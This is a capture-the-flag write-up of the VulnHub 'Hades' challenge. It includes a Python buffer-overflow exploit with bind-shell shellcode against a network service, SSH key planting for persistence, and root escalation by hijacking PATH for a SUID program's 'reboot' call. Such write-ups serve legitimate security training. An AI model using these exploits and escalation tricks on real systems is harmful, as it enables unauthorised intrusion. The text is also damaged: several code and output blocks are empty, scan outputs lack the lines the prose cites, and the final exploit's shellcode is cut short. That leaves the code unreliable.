A few weeks ago, [VulnHub](http://www.vulnhub.com) hosted the Hades [competition](http://blog.vulnhub.com/2014/04/competition-hades.html); a capture the flag challenge created by Lok_Sigma. Hades is touted as a difficult boot2root, requiring some experience in exploit writing and reverse engineering. The competition ran for a good 4 weeks, and with submissions now closed, I've decided to go ahead post my solution.

### Looking for holes

I started off by running netdiscover in order to identify Hades' IP address. Since I was only running two virtual machines in the 172.16.229.0/24 network, it was easy to identify Hades:

```
root@kali:~# netdiscover -r 172.16.229.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 172.16.229.254  00:50:56:e5:12:da    01    060   VMWare, Inc. 
```

Target acquired! Hades had been assigned the IP address 172.16.229.130. The next step was to scan for any open services that might be vulnerable to something. I busted out nmap and scanned the entire TCP port range: 

```
root@kali:~# nmap -T5 -p- 172.16.229.130

Starting Nmap 6.40 ( http://nmap.org ) at 2014-04-13 18:40 EDT
Nmap scan report for 172.16.229.130
Host is up (0.00040s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE

65535/tcp open  unknown
MAC Address: 00:0C:29:F7:63:14 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 14.70 seconds
```

Two open ports were discovered, SSH on port 22, and some unknown service on port 65535. I decided to check out port 65535 first using netcat:

```
root@kali:~# nc -v 172.16.229.130 65535
nc: 172.16.229.130 (172.16.229.130) 65535 [65535] open
Welcome to the jungle.  
Enter up to two commands of less than 121 characters each.
```

It was some kind of service that was waiting for user input. I went ahead and played with it for a bit. The first two commands were acknowledged by the service with a "Got it". Any additional input was ignored, although the service never terminated the connection: 

```
root@kali:~# nc -v 172.16.229.130 65535
nc: 172.16.229.130 (172.16.229.130) 65535 [65535] open
Welcome to the jungle.  
Enter up to two commands of less than 121 characters each.
AAAAA
Got it
BBBBB
Got it
CCCCC
DDDDD
EEEEE
```

I spent a little bit of time trying different kinds of input to see if I could change its behavior or trigger some command injection. Nothing worked, so I moved on to port 22. 

Port 22 is usually SSH, so I tried connecting to it using ssh as the root user. 

```
root@kali:~# ssh root@172.16.229.130

root@172.16.229.130's password: 
```

A large block of text was immediately returned. I copied the first few characters "f0VMRgEBAQ" and entered it into Google. The results implied that the block of text was something that had been Base64 encoded. 

![](/images/2014-05-16/01.png)

With that in mind, I copied the block of test into a file called "foo.txt" and used the base64 command to decode it and redirect the results into a file called "bar"

```
root@kali:~# base64 -d foo.txt > bar
root@kali:~# file bar
bar: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xc0bc41d21254d7f04d83fec32b7345d3505c0759, not stripped

As it turned out, the decoded file was a ELF executable. Out of curiousity to see what it would do I went ahead and ran the program. 

root@kali:~# chmod 755 bar
root@kali:~# ./bar
```

It generated no output, but it was definitely doing something since it didn't exit. Suspecting that this was the same service running on port 65535 on Hades, I attempted to connect to the same port on my machine:

```
root@kali:~# nc -v localhost 65535
nc: cannot connect to localhost (::1) 65535 [65535]: Connection refused
nc: localhost (127.0.0.1) 65535 [65535] open
Welcome to the jungle.  
Enter up to two commands of less than 121 characters each.
```

Sure enough, my assumption was correct. I now had a local copy of the service for closer inspection, and I was betting that the keys to the kingdom were in there somewhere. 


### Pwning port 65535

This service requested that each command should be less than 121 characters each. I decided to see how it would handle 200 characters. On one terminal, I set ulimit for core files to unlimited and restarted bar. 

```
root@kali:~# ulimit -c unlimited
root@kali:~# ./bar
```

Once the service was running, I sent 200 bytes to the service:

```
root@kali:~# python -c 'print "A" * 200' | nc localhost 65535
Welcome to the jungle.  
Enter up to two commands of less than 121 characters each.
Got it
Got it
root@kali:~# 
```

Sure enough, the service crashed with a segmentation fault and core dumped:

```
Received: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Received: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

here
Segmentation fault (core dumped)
root@kali:~#
```

I loaded up the core file in gdb and examined the registers. 

```
root@kali:~# gdb -q -c core

Core was generated by `./bar'.

EIP and EBP had both been overwritten with 0x41414141, so I knew I could control the program's execution flow. Looking at the stack showed that I controlled a good chunk of it. 

```
(gdb) x/40wx $esp

```

Unfortunately the area I controlled was 32 bytes away from ESP. I would need to find a way to remove at least 32 bytes from the stack and then jump to it so I could execute my shellcode. Before going any further, I needed to find EIP's offset. Metasploit's pattern_create.rb did the job:  

```
root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 200 | nc localhost 65535
Welcome to the jungle.  
Enter up to two commands of less than 121 characters each.
Got it
Got it
```

I loaded up the new core file and it showed that EIP had been overwritten by  0x41376641

```
root@kali:~# gdb -q -c core
[New LWP 4829]
Core was generated by `./bar'.
Program terminated with signal 11, Segmentation fault.
#0  0x41376641 in ?? ()
(gdb)

Using pattern_offset.rb, I identified EIP's offset at 171:

root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x41376641
[*] Exact match at offset 171

```

I controlled a decent portion of the stack for storing shellcode but that wouldn't do much good if the binary was compiled with NX. I ran checksec.sh against the binary:

```
root@kali:~# ./checksec.sh --file bar
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   bar
```

No NX so I could definitely execute shellcode on the stack. However I still had to figure out how to jump to the shellcode, which was 32 bytes away from the stack. I decided to have a look at the instructions in the binary using objdump. I was interested in add or pop instructions that operated on ESP. I found one in particular that would add 28 bytes to ESP.  

```
root@kali:~# objdump -D bar | grep -e 'add.*esp'
 80489a9:	83 84 24 8c 01 00 00 	addl   $0x1,0x18c(%esp)
 8048a32:	83 c4 1c             	add    $0x1c,%esp
```
 
ADD $0x1C,%ESP would be perfect for removing 28 bytes. That meant i just needed a POP instruction to remove another 4 bytes and the top of the stack would contain my shellcode. As it turned out, this particular instruction happened to be followed by 4 POP instructions and a RET:

```
root@kali:~# gdb -q -batch -n -se bar -ex 'x/10i 0x08048a32'
   0x8048a32 <__libc_csu_init+82>:	add    $0x1c,%esp
   0x8048a35 <__libc_csu_init+85>:	pop    %ebx
   0x8048a36 <__libc_csu_init+86>:	pop    %esi
   0x8048a37 <__libc_csu_init+87>:	pop    %edi
   0x8048a38 <__libc_csu_init+88>:	pop    %ebp
   0x8048a39 <__libc_csu_init+89>:	ret    
   0x8048a3a <__i686.get_pc_thunk.bx>:	mov    (%esp),%ebx
   0x8048a3d <__i686.get_pc_thunk.bx+3>:	ret    
   0x8048a3e <__i686.get_pc_thunk.bx+4>:	nop
   0x8048a3f <__i686.get_pc_thunk.bx+5>:	nop
```

So this instruction would remove 44 bytes from the stack, which would still return to an area I controlled. After executing RET, this would set EIP to the next address on the stack. This address should ideally point to a JMP ESP instruction. Using msfelfscan I was able to find one such address in the binary:

```

root@kali:~# msfelfscan -j esp bar
[bar]
0x08048697 jmp esp
```

To exploit this program, EIP needed to be overwritten with 0x08048a32, which would clear the stack. That series of instructions ends with a RET, which would set EIP to an address pointing to a JMP ESP. This in turn would begin executing the shellcode. I started the PoC with the following:

```python
#!/usr/bin/env python
import socket, struct

target = "127.0.0.1"
port = 65535

buf  = "A" * 17                         # junk  
buf += struct.pack("<I", 0x08048697)    # jmp esp
buf += "B" * 150                        # shellcode goes here
buf += struct.pack("<I", 0x08048a32)    # add 0x1c/pop/pop/pop/pop/ret 
buf += "C"* 25                          # junk

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.recv(1024)
s.send(buf)
s.recv(1024)
s.close()
```

I restarted the service, attached gdb to it, and set a breakpoint at 0x08048a32.

```text

```

I executed the PoC which in turn overwrote EIP and redirected execution to 0x08048a32. At this point gdb paused. Examining the next 6 instructions in EIP showed I was in the right location. 

```
Breakpoint 1, 0x08048a32 in __libc_csu_init ()
(gdb) x/6i $eip
=> 0x8048a32 <__libc_csu_init+82>:	add    $0x1c,%esp
   0x8048a35 <__libc_csu_init+85>:	pop    %ebx
   0x8048a36 <__libc_csu_init+86>:	pop    %esi
   0x8048a37 <__libc_csu_init+87>:	pop    %edi

   0x8048a39 <__libc_csu_init+89>:	ret  
```

The first five instructions would clear the top of the stack, so I stepped through them. Before executing the RET, I looked at the stack:

```
(gdb) ni
0x08048a35 in __libc_csu_init ()
(gdb) 
0x08048a36 in __libc_csu_init ()

0xbfc44d9c:	0x08048697	0x42424242	0x42424242	0x42424242
0xbfc44dac:	0x42424242	0x42424242	0x42424242	0x42424242

0xbfc44ddc:	0x42424242	0x42424242	0x42424242	0x42424242
```

The top of the stack contained the address 0x08048697, which pointed to a JMP ESP instruction. After that executed, EIP would be pointing to the top of the stack right at the start of my shellcode. 

The following shellcode from http://repo-shell-storm.org will bind a shell on port 11111/TCP

```python
# 73-byte bind shell shellcode on TCP/11111
# http://repo.shell-storm.org/shellcode/files/shellcode-836.php
shellcode = (
"\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a"
"\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68"
"\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1"
"\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd"
"\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f"
"\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
"\x41\xcd\x80"
)
```

At this point, I completed the PoC as follows: 

```python
#!/usr/bin/env python
import socket, struct

# 73-byte bind shell shellcode on TCP/11111
# http://repo.shell-storm.org/shellcode/files/shellcode-836.php
shellcode = (

"\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f"
"\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
"\x41\xcd\x80"
)

buf =  "\x41"*17                        # this stuff gets pop'd off
buf += struct.pack("<I", 0x08048697)    # jmp esp. land here after we pop
                                        # the stack several times

buf += shellcode                        # bind shellcode
buf += "\x42"*77                        # junk
buf += struct.pack("<I", 0x08048a32)    # add 0x1c/pop/pop/pop/pop/ret
buf += "\x43"*25                        # junk

target = "127.0.0.1"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, 65535))

s.recv(1024)
s.send(buf)
s.recv(1024)
s.close()
```

I restarted the service, ran the exploit, and used netstat to verify that port 11111 had been opened:

```

I fired up netcat and connected to port 11111 and obtained a shell. 

```
root@kali:~# nc -v localhost 11111
nc: cannot connect to localhost (::1) 11111 [11111]: Connection refused
nc: localhost (127.0.0.1) 11111 [11111] open

```

Confident that I had a working exploit, I updated the code to target 172.16.229.130. I ran the exploit once again, and used netcat to connect to port 11111 on 172.16.229.130

```
root@kali:~# nc -v 172.16.229.130 11111

```

I now had a foothold on the server as user loki. Now I had to escalate to a root shell get that flag.  


### Getting a root shell

Before going any further, I decided to setup a passwordless SSH login into the server. By copying my SSH public key over to loki's account, I could login with SSH and get a proper interactive shell. On Hades: 

```
cd /home/loki
mkdir .ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAl+87gccDnr6OVHGe97cdIsRycY2fBzwXeM3RjWBQuUUunTUgWW4568XM/NrqPxTCOu4vrsBYVEN3YBbHQ/53z0BClO6LCI5UysNjszYnpRP4H7fO6fsq21UJu6iTlZS+Pw6AZyruvXXBQmZ3zn6AkBSRPlAuDrxPaHHsHWQBhr5KcGr68rrD7xL7y+VNWUHzXYCjQ51/oy0ssnGFv553zXVkkTOlu8UL5NeOEHfCzeIKEnRe+A8032NvvZGt5E2nHFWYpoyfvyrh0i/M+NRjkHZJBQ2cR9OGLvIs0Dn3Spt/IuGWU5BsSpFCuSlm2CDC02Wmi+27rhCEe2gCPkQz root@kali' > .ssh/authorized_keys
chmod 600 .ssh/authorized_keys
chmod 700 .ssh
```

I went ahead and killed the netcat connection and logged in to Hades directly as loki.

```
# ssh loki@172.16.229.130
.
.
.
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

loki@Hades:~$
```

I listed the contents of loki's home directory and found a couple of interesting files: loki_server and notes.

```
loki@Hades:~$ ls -latr
total 44
-rw-r--r-- 1 root root   40 Mar 18 20:22 .bash_history
-rwsr-sr-x 1 loki loki 7035 Mar 18 20:57 loki_server

drwx------ 2 loki loki 4096 Apr 15 01:18 .ssh
drwx------ 2 loki loki 4096 Apr 15 01:20 .cache
```

loki_server seemed to be the same service I just exploited. The contents of notes appeared to be hints of some sort:

```
loki@Hades:~$ cat notes 
AES 256 CBC
Good for you and good for me.
```

I kept note of that knowing that it would probably come in handy later. 

I didn't have permissions to view the contents of /root just yet so I did a bit of exploring on the server. Eventually I found a couple of things that looked interesting: /root/key_file and /root/display_root_ssh_key. I didn't have read permissions on /root/key_file, so I decided to look into /root/display_root_ssh_key instead. 

```
loki@Hades:/display_root_ssh_key$ ls -la
total 280
drwxr-xr-x  2 root root   4096 Mar 18 20:31 .
drwxr-xr-x 23 root root   4096 Mar 19 17:27 ..
-rw-------  1 root root      1 Mar 19 19:38 counter
-rwsr-sr-x  1 root root 273048 Mar 18 20:31 display_key
loki@Hades:/display_root_ssh_key$
```

This looked promising. display_key had SUID root permissions, so if I could make it launch a shell for me, I could get root privileges. There was another file, counter, but alas I had no read access to its contents. I went ahead and executed display_key to see what it did. 

```
loki@Hades:/display_root_ssh_key$ ./display_key

Enter password: 
12345     
loki@Hades:/display_root_ssh_key$ ./display_key

Enter password:

The system is going down for reboot NOW!
Connection to 172.16.229.130 closed by remote host.
Connection to 172.16.229.130 closed.
```

For some reason the machine rebooted the second time I ran the program. I figured this must be some kind of countermeasure to prevent automated fuzzing, or just to annoy the attacker. After Hades had restarted, I decided to copy display_key over to my machine and examine it there.

```
root@kali:~# scp loki@172.16.229.130:/display_root_ssh_key/display_key .
.
.
.
display_key                                                    100%  267KB 266.7KB/s   00:00    
root@kali:~# file display_key 
display_key: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, stripped
```

The file command reported it as a static stripped executable, meaning debugging this would be difficult. 

Before examining the file further, I removed /sbin/reboot on my machine and replaced it with a symbolic link to /bin/hostname. If display_root was calling the reboot command, this would prevent my machine from rebooting. 

```
root@kali:~# ls -l /sbin/reboot
lrwxrwxrwx 1 root root 4 Jan  8 21:15 /sbin/reboot -> halt
root@kali:~# ln -sf /bin/hostname /sbin/reboot
root@kali:~# ls -l /sbin/reboot
lrwxrwxrwx 1 root root 13 Apr 14 11:55 /sbin/reboot -> /bin/hostname
```

With some precuations in place, I ran the program again.

```
root@kali:~# ./display_key 

	Ready to dance?

Enter password: 
12345
Segmentation fault (core dumped)
```

It was odd that it crashed immediately, which was different from how it behaved on Hades. I tried running it with gdb but it wasn't very informative, so I decided to use strace instead. I ran display_key against it and found the reason for the crash: 

```

```

The counter file was missing. I went ahead and created it to see what would happen. Since I couldn't read the actual counter file, I just threw in some random value in it. 

```

Ok, much better. The program opens the counter file to change its contents, but for what purpose, I didn't know. I ran the program again until it triggered its reboot feature. This is the interesting bit that caught my eye: 

```
[080490af] clone(Process 27730 attached

[pid 27730] [08056844] execve("/bin/sh", ["sh", "-c", "reboot"], [/* 32 vars */]) = 0
[pid 27730] [b77c325d] brk(0)           = 0x98e9000

```

The program calls reboot without specifying an absolute PATH. This meant I could trick it into running my own code as long as it was in a directory before /sbin. I created a reboot symbolic link to /bin/dash in my home directory and updated my PATH variable so that my home directory was first on the list. 

```
root@kali:~# ln -s /bin/dash reboot
root@kali:~# export PATH=/root:${PATH}
root@kali:~# ls -l reboot
lrwxrwxrwx 1 root root 9 Apr 14 21:05 reboot -> /bin/dash
root@kali:~# echo $PATH
/root:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Once that was done, I ran display_root again until it triggered its call to reboot, and gave me a shell instead:

```
root@kali:~# ./display_key 

	Ready to dance?

Enter password: 
12345
#
# id
uid=0(root) gid=0(root) groups=0(root)
```

Could it be that simple? I decided to try it on Hades and see if it would work. I created the same setup as I had done on my machine so that I had a symbolic link reboot to /bin/dash and updated my PATH so that my symbolic link to /bin/dash would be called instead of /sbin/reboot:

```
loki@Hades:~$ pwd
/home/loki
loki@Hades:~$ ln -s /bin/dash reboot
loki@Hades:~$ export PATH=/home/loki:${PATH}
loki@Hades:~$ ls -l reboot
lrwxrwxrwx 1 loki loki 9 Apr 15 02:52 reboot -> /bin/dash
loki@Hades:~$ echo $PATH
/home/loki:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
loki@Hades:~$ cd /display_root_ssh_key/
```

Fingers crossed, I executed display_key several times until the reboot feature was triggered: 

```
loki@Hades:/display_root_ssh_key$ ./display_key 

	Ready to dance?

Enter password: 
12345
# id
uid=1000(loki) gid=1000(loki) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(loki)
# whoami
root
```

Yes! Sure enough, the program called reboot, but instead executed /home/loki/reboot which in turn dropped me into a root shell. 

### Capturing the flag

I quickly headed over to /root and did a directory listing. 

```
# ls -latr
total 36
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc

drwxr-xr-x 23 root root 4096 Mar 19 17:27 ..
-rw-------  1 root root 1352 Mar 19 19:04 .viminfo

drwx------  4 root root 4096 Mar 19 19:07 .
-rw-r--r--  1 root root  363 Apr  4 19:08 .bash_history
```

I found the flag, but it was encrypted. The challenge wasn't over yet. The file command wasn't available on Hades, but using xxd, I recognized the header as a file encrypted with the openssl command:

```
# xxd -g1 flag.txt.enc | head

```

I remembered the file /home/loki/notes that mentioned "AES 256 CBC" and "Good for you and good for me.". Assuming that was the cipher and password used to encrypt the file I gave it a shot:

```
# openssl enc -d -aes-256-cbc -pass pass:"Good for you and good for me." -in flag.txt.enc -out flag.txt
bad decrypt
3074083016:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:evp_enc.c:539:
```

Unfortunately that didn't work. I then remembered /key_file. Now that I had root access I could read the contents. This turned out to be a binary file and I couldn't see anything recognizable in it:

```
# xxd -g1 key_file | head

```

I wondered if this file might have been used to encrypt the flag. OpenSSL can take the password from either a string, a file descriptor, an environment varible, or a file, so it was worth a shot. 

```
# openssl enc -d -aes-256-cbc -pass file:/key_file -in flag.txt.enc -out flag.txt
# ls -l flag.txt
-rw-rw-r-- 1 root root 3352 Apr 15 03:42 flag.txt
```

No error message! It looked like the decryption worked. I opened flag.txt and was congratulated for finishing the challenge. 

```
# cat flag.txt

### Final thoughts

I suspect there's more than one way to get root on the server. Further analysis of the display_key binary showed that it was vulnerable to a buffer overflow that allowed me to overwrite EIP. The display_key was compiled with NX, so it looks like a little creativity will be required to exploit it. That should give me something to work on until the next challenge.

Overall this was a thoroughly enjoyable boot2root. I look forward to the next challenge. Many thanks to Lok_Sigma and VulnHub, and shout outs to [barrebas](https://twitter.com/barrebas) and [TheColonial](https://twitter.com/TheColonial) who were always one step ahead of me in the competition.
